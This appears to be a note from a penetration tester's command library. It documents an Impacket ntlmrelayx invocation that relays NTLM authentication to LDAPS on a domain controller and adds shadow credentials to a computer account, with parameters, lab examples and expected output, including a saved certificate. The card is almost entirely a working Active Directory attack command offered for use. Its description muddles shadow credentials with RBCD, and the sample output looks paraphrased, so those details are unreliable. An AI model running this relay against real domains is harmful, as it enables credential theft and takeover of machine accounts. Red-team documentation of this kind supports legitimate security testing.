---
type: command
executor: bash
data: >-
  proxychains python3 ntlmrelayx.py -t ldaps://$_TARGET_DC --shadow-credentials
  --shadow-target $_TARGET_COMPUTER$ --http-port $_HTTP_PORT
tags:
  - ntlm-relay
  - rbcd
  - shadow-credentials
platforms:
  - Linux
verified: true
validated: true
---

# ntlmrelayx-relay-to-ldaps-for-shadow-credentials

## Command

```bash
proxychains python3 ntlmrelayx.py -t ldaps://$_TARGET_DC --shadow-credentials --shadow-target $_TARGET_COMPUTER$ --http-port $_HTTP_PORT
```

## Description

Sets up an NTLM relay attack using Impacket's ntlmrelayx to target LDAPS on a domain controller, enabling RBCD abuse by adding shadow credentials to a computer account when authentication is relayed.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_DC | FQDN or IP of the domain controller (e.g., dc1.ez.lab) | Yes |
| --shadow-credentials | Enable shadow credentials injection via RBCD | Yes |
| --shadow-target | Target computer account to modify (e.g., ws2$) | Yes |
| --http-port | Local HTTP port for incoming relay triggers (e.g., 81) | Yes |
| proxychains | Route through SOCKS proxy if needed | No |

## Examples

### Basic Usage

```bash
proxychains python3 ntlmrelayx.py -t ldaps://dc1.ez.lab --shadow-credentials --shadow-target ws2$ --http-port 81
```

### Advanced Usage

```bash
proxychains python3 ntlmrelayx.py -t ldaps://dc1.ez.lab --shadow-credentials --shadow-target ws2$ --http-port 81 -smb2support
```

## Expected Output

Relay listening on ports: 445 (SMB), 80/$_HTTP_PORT (HTTP)
[HTTP] Incoming connection from ... (when triggered)
LDAPS-Auth: Hashes relayed, shadow credential added
Certificate saved to ws2.pfx

## Related

- [[procedures/Workstation-Takeover-with-RBCD]]
- [[tools/Impacket]]
